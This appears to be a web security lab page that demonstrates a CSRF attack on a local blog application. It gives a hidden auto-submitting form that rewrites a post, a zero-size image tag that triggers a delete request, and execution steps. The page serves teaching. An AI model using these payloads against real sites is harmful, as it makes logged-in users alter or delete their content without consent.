🎯 CSRF Attack Lab - Shifat's Malicious Page

⚠️ LAB SCENARIO: User "shifat" (password: 1234) cannot directly edit victim's posts due to authorization checks. However, because the application has NO CSRF tokens, shifat can force a logged-in victim to unknowingly edit posts!

📋 Attack Scenario

Attacker: shifat (cannot edit victim's posts directly)

Victim: admin or victim user (must be logged in)

Goal: Force victim to edit a post they own, changing content to shifat's malicious text

🛠️ Method 1: Hidden Auto-Submit Form

This form auto-submits when the victim visits this page while logged in:

<form id="csrf-form" action="http://localhost/SQLMAP_Lab/edit.php?id=1" method="POST"> <input type="hidden" name="title" value="HACKED BY SHIFAT"> <input type="hidden" name="content" value="This post was modified via CSRF attack!"> </form> <script>document.getElementById('csrf-form').submit();</script>

🛠️ Method 2: Image Tag GET Request (for delete.php)

For actions that use GET (like delete.php), an image tag can trigger the action:

<img src="http://localhost/SQLMAP_Lab/delete.php?id=1" width="0" height="0">

🚀 Execute the Attack

Steps:

  1. Login as victim or admin in one browser tab
  2. Come back to this page and click the button below
  3. The form will auto-submit using the VICTIM's session!
  4. Check the blog - the post will be modified!
🔥 Execute CSRF Attack
💡 Why this works: The browser automatically sends the victim's session cookie with the request. The server sees a valid logged-in user and processes the edit. There is NO CSRF token to verify the request actually came from the legitimate form!
